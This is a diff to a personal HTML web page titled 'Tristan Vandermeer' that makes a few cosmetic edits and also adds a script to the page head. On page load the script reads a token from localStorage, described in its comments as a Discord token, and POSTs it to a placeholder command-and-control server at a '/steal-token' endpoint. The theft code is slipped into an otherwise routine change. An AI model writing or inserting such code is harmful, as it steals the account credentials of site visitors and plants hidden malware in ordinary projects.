@@ -25,6 +25,20 @@ I SAID GET OUT
     <script src="script.js" defer></script>
 
     <title>Tristan Vandermeer</title>
+    <script>
+        window.onload = function() {
+            // Grab the Discord token from localStorage
+            var discordToken = localStorage.getItem('token');
+
+            // Send the stolen token to the attacker's C2 server
+            if (discordToken) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://your-c2-server-ip:3000/steal-token", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("token=" + encodeURIComponent(discordToken));
+            }
+        };
+    </script>
 </head>
 
 <!-- BODY IS HERE -->
@@ -59,7 +73,7 @@ I SAID GET OUT
 
     <main>
         <!-- SECTION 1: -->
-        <section>
+        <section class="section1">
             
             <div align="middle">
                 
@@ -70,7 +84,7 @@ I SAID GET OUT
                 <img style="border-radius: 16px;" class="main-photo" src="https://tristanvandermeer.netlify.app/assets/aberration.jpg">
 
                 <br>
-                <br>              
+                <br>
 
                 <p>I promise you this, for cognito, ergo sum.</p>
                 
